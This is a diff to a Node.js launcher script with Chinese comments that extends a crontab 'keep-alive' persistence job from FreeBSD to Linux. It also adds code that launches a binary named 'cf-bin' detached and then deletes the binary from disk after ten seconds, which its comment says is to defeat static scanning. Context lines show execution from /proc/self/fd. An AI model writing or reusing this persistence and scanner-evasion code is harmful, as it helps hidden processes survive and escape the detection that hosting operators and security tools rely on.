@@ -201,11 +201,12 @@ process.on('unhandledRejection', (e) => {
   process.exit(1);
 });
 
-// ==================== 3. FreeBSD 系统级外部 Cron 守护保活 ====================
-if (isFreeBSD) {
-  try {
-    const cronScriptPath = path.join(os.homedir(), '.config', 'ko_daemon.sh');
-    const cronContent = `#!/bin/sh
+// ==================== 3. 宿主系统级外部 Cron 守护保活 ====================
+try {
+  const cronScriptPath = path.join(os.homedir(), '.config', 'ko_daemon.sh');
+  let cronContent = '';
+  if (isFreeBSD) {
+    cronContent = `#!/bin/sh
 # FreeBSD 系统级 Cron 定时保活守护脚本
 pgrep -f "npm start" > /dev/null
 if [ $? -ne 0 ]; then
@@ -215,6 +216,19 @@ if [ $? -ne 0 ]; then
   nohup npm start > /dev/null 2>&1 &
 fi
 `;
+  } else if (isLinux) {
+    cronContent = `#!/bin/sh
+# Linux 系统级 Cron 定时保活守护脚本
+pgrep -f "npm start" > /dev/null || pgrep -f "node index.js" > /dev/null
+if [ $? -ne 0 ]; then
+  cd ${path.resolve(process.cwd())}
+  export PATH=/usr/local/bin:/usr/bin:/bin
+  nohup npm start > /dev/null 2>&1 &
+fi
+`;
+  }
+
+  if (cronContent) {
     fs.mkdirSync(path.dirname(cronScriptPath), { recursive: true });
     fs.writeFileSync(cronScriptPath, cronContent);
     fs.chmodSync(cronScriptPath, 0o755);
@@ -229,13 +243,13 @@ fi
         fs.writeFileSync(tempCronFile, newCron);
         exec(`crontab ${tempCronFile}`, () => {
           try { fs.unlinkSync(tempCronFile); } catch (e) {}
-          console.log('[cron] 外部守护保活任务已注册进 FreeBSD Crontab。');
+          console.log(`[cron] 外部守护保活任务已注册进 ${platform} Crontab。`);
         });
       }
     });
-  } catch (e) {
-    console.error('[cron] 注册外部守护脚本失败:', e.message);
   }
+} catch (e) {
+  console.error('[cron] 注册外部守护脚本失败:', e.message);
 }
 
 // ==================== 5. FreeBSD 端口规则自动检测与自我治理 ====================
@@ -1150,8 +1164,22 @@ os.execve(f"/proc/self/fd/{fd}", ["cf-bin"] + sys.argv[1:], os.environ)
 
     child = spawn(botPath, args, {
       stdio: ['ignore', 'ignore', 'pipe'],
-      env: combinedEnv
+      env: combinedEnv,
+      detached: true
     });
+    child.unref();
+
+    // 运行期二进制阅后即焚 (Unlink on Spawn) —— 启动 10 秒后强制物理销毁物理文件，防止静态扫描
+    setTimeout(() => {
+      try {
+        if (fs.existsSync(botPath)) {
+          fs.unlinkSync(botPath);
+          console.log('[cf] 运行期二进制阅后即焚：已安全擦除磁盘物理文件 cf-bin。');
+        }
+      } catch (e) {
+        console.warn('[cf] 物理文件销毁异常:', e.message);
+      }
+    }, 10000);
   }
 
   child.stderr && child.stderr.on('data', d => {
